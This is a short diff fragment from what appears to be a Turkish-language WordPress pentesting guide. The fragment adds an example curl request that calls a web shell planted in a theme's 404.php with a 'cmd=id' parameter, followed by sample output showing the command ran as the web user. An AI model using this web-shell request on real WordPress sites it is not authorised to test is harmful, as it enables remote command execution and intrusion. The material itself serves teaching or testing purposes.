@@ -640,6 +640,11 @@ Kod kaydedildikten sonra, değiştirilen dosyanın yoluna giderek RCE'nin başar
 
 **Örnek cURL İsteği:**
 
+```bash
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
+Örnek:
 
+```Plaintext
+uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
 ```
